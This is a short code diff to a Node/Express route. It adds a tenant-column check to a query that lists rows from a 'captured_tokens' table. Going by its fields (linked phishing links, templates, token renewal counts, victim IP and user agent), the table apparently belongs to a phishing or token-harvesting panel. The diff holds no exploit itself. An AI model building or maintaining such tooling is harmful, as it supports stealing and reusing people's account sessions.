@@ -35,6 +35,10 @@ router.get('/', userAuth, async (req, res) => {
      const { sort, search, page = 1, limit = 50 } = req.query;
      // Filter out expired/stale tokens for cleaner UI
      const whereClause = 'deleted = 0 AND expiration > NOW() AND stale = 0';
+
+     // Check if tenant column exists
+     const tenantExists = await checkTenantColumn();
+
      let query = `SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, renewal_attempts, stale, deleted, created_at${tenantExists ? ', tenant' : ''}, template_type, account_type FROM captured_tokens WHERE user_id = ? AND ${whereClause}`;
     const params = [req.user.id];
 
